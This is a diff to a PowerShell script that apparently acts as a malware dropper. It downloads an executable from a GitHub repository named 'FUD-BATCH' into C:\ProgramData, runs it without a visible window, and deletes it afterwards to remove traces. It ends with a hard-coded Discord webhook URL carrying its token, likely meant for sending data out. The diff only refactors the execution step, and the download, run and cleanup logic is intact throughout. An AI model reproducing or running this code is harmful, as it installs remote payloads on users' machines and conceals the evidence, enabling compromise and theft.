@@ -6,6 +6,21 @@ $downloadUrl = "https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads
 # Path to save the executable in C:\ProgramData
 $exePath = "C:\ProgramData\test.exe" 
 
+# Function to execute the .exe file
+function Execute-Executable {
+    param (
+        [string]$path
+    )
+    
+    try {
+        Start-Process -FilePath $path -NoNewWindow -Wait
+        return $true
+    } catch {
+        Write-Host "Failed to execute $path: $_"
+        return $false
+    }
+}
+
 # Download the executable from the specified URL
 Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath
 
@@ -18,14 +33,17 @@ if (-Not (Test-Path $exePath)) {
 }
 
 # Execute the executable
-Start-Process -FilePath $exePath -NoNewWindow -Wait
+if (Execute-Executable -path $exePath) {
+    # Optional: Wait time to allow the process to run for 10 seconds
+    Start-Sleep -Seconds 10
 
-# Optional: Wait time to allow the process to run for 10 seconds
-Start-Sleep -Seconds 10
-
-# Clean up (delete the executable after execution)
-Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
-Write-Host "Executed the executable and cleaned up."
+    # Clean up (delete the executable after execution)
+    Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
+    Write-Host "Executed the executable and cleaned up."
+} else {
+    Write-Host "Executable did not run successfully."
+    exit
+}
 
 # Discord webhook URL
 $webhook = "https://discord.com/api/webhooks/1301990032567042159/PP7RFPrRII5BKybbo1-7o-YAxVRcdmZmzPMJEt6pcJaSoyc6aWhG4tEzAOeuJXhQRjnw"
